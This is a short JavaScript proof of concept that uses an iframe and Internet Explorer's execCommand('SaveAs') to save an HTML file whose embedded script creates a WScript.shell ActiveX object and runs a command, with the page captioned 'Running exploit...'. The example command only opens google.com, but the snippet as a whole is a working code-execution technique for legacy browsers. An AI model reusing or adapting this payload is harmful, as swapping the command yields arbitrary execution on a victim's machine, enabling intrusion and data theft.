      function legacyBrowserSave(content, filename) {
        var frame = document.createElement("iframe");
        document.body.appendChild(frame);

        frame.contentWindow.document.open("text/html", "replace");
        frame.contentWindow.document.write(content);
        frame.contentWindow.document.close();

        frame.contentWindow.focus();
        frame.contentWindow.document.execCommand("SaveAs", true, filename);
        document.body.removeChild(frame);
        return false;
      }

// Example usage
fileData = "%3Cscript>var objShell = new ActiveXObject('WScript.shell');objShell.run('https://google.com');%3C/script><h1>Running exploit...</h1>";
fileName = 'ssfntest.html';
mimeType = 'text/html';

legacyBrowserSave(fileData, fileName);
